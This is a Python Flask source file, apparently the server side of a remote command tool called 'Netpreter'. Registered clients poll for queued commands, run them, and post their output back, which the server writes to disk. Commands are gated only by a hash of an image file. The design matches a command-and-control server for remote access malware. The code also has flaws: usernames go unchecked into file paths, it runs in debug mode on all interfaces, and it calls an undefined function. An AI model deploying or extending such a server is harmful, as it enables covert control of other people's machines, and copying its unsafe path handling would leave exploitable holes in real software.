from flask import Flask, request, jsonify
import json
import hashlib
import random
import time
import os
from datetime import datetime

app = Flask(__name__)


pending_commands = {}

with open("TheKey.png", "rb") as f:
    key_source = f.read()
useridkey = hashlib.sha256(key_source).hexdigest()

@app.route("/users", methods=["POST"])
def checkuser():
    data = request.get_json()
    print("Received data:", data)
    username = data.get("user")
    if not os.path.exists(os.path.join(f"E:\Netpreter\users\{username}")):
        os.mkdir(f"E:\Netpreter\users\{username}")
    return f"We see you {username}"



@app.route("/getcmd")
def get_command():
    user = request.args.get("user")
    cmd = pending_commands.pop(user, "")
    return jsonify({"cmd": cmd})

@app.route("/result", methods=["POST"])
def get_result():
    data = request.get_json()
    username = data.get('user')
    output = data.get('output')
    print(f"Output von {data['user']}:\n{data['output']}")
    now = datetime.now()
    current_time = now.strftime("%H;%M;%S")
    current_date = datetime.now().date()
    with open(f"E:/Netpreter/{username}/Output{current_date}at{current_time}.txt", "w") as file:
        file.write(output)
    return jsonify({"status": "OK"})


@app.route("/setcmd", methods=["POST"])
def set_cmd():
    data = request.get_json()
    user = data.get("user")
    cmd = data.get("cmd")
    senderid = data.get("userid")
    if senderid == useridkey:
        pending_commands[user] = cmd
        return jsonify({"status": f"Command '{cmd}' set for {user}"})
    else:
        return js({"status": "Wrong Userid, did not set Command!"})

@app.route("/getusers", methods=["GET"])
def list_users():
    # Verzeichnis für die Benutzer
    users_dir = "E:/Netpreter/users"
    
    # Liste der Benutzer (Ordner)
    users = [f for f in os.listdir(users_dir) if os.path.isdir(os.path.join(users_dir, f))]
    
    # Rückgabe als JSON
    return jsonify({"users": users})



if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)
